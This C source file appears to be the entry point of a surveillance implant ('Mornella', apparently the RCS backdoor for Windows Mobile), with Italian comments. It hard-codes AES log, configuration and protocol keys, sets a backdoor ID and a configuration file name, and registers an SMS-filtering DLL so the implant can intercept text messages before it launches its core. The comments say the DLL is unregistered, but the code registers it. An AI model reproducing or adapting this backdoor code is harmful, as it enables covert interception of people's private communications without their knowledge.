// Mornella Static
#include "Core.h"
#include <stdio.h>

int WINAPI main(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow) {
	Core core;

	// RCS 66 su rcs-preprod
	BYTE LogKey[] = { 0x16, 0x88, 0x6f, 0x71, 0xfa, 0xd6, 0x4c, 0x36, 0xca, 0xd2, 0x70, 0xbe, 0x92, 0x59, 0x63, 0x41 };

	BYTE ConfKey[] = { 0xa2, 0x0d, 0xb9, 0x2c, 0x31, 0x61, 0x10, 0x9f, 0x00, 0x67, 0xbb, 0xe7, 0x3a, 0xa7, 0x8f, 0xa8 };

	// Sign sul DB
	BYTE ProtoKey[] = { 0x96, 0x77, 0x8a, 0xf9, 0x75, 0x6a, 0x30, 0x48, 0x9f, 0x64, 0x35, 0xbb, 0x06, 0x55, 0xee, 0xc2 };

	g_hInstance = hInstance;

	// Configurazione artificiale di alcune variabili
	ZeroMemory(g_AesKey, 32);
	ZeroMemory(g_Challenge, 32);
	ZeroMemory(g_ConfKey, 32);

	ZeroMemory(g_BackdoorID, 16);
	ZeroMemory(g_ConfName, 32 * sizeof(WCHAR));

	CopyMemory(g_AesKey, LogKey, 16);
	CopyMemory(g_Challenge, ProtoKey, 16);
	CopyMemory(g_ConfKey, ConfKey, 16);
	CopyMemory(g_BackdoorID, "RCS_0000000066", strlen("RCS_0000000xxx"));
	CopyMemory(g_ConfName, L"cptm511.dql", WideLen(L"cptm511.dql"));
	// Fine configurazione artificiale

	// Unregistriamo la DLL
	HMODULE hSmsFilter;

	// Installiamo la DLL del filtro SMS
	hSmsFilter = NULL;
	typedef HRESULT (*pRegister)();
	pRegister RegisterFunction;

	// Unregistriamo la DLL per il filtering degli SMS
	hSmsFilter = LoadLibrary(SMS_DLL);

	if (hSmsFilter != NULL) {
		RegisterFunction = (pRegister)GetProcAddress(hSmsFilter, L"DllRegisterServer");

		if (RegisterFunction != NULL) {
			RegisterFunction();
		}

		FreeLibrary(hSmsFilter);
	}
	//

	core.Run();

	return 0;
}
